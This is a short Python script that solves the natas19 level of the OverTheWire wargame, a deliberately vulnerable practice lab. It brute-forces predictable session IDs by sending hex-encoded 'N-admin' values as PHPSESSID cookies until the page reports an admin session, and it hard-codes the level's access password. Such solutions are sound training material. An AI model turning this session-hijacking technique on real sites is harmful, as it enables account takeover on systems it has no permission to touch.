# Name: Michael Krakovsky
# Date: April 22, 2019
# Description: Create a script to break the code on natas19.
# Version: 1.0

from requests import Session
from pyperclip import copy
from codecs import encode
from binascii import hexlify

username = "natas19"
passwd = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
url = "http://natas19.natas.labs.overthewire.org/"

session = Session()

for i in range(1, 641):             # Loop through every session to find the admin password
    hexNum = str(hexlify(encode(str(i) + "-admin")))            # The converted hex numbers
    hexNum = hexNum[2:-1]
    getResponse = session.post(url,
                                cookies={"PHPSESSID": hexNum}, 
                                data={"username": "admin", "password": "mike"}, 
                                auth=(username, passwd))   
    print("We have tried the hex code: " + hexNum)
    if ("You are an admin" in getResponse.text):
        print(getResponse.text)
        break

copy(getResponse.text)
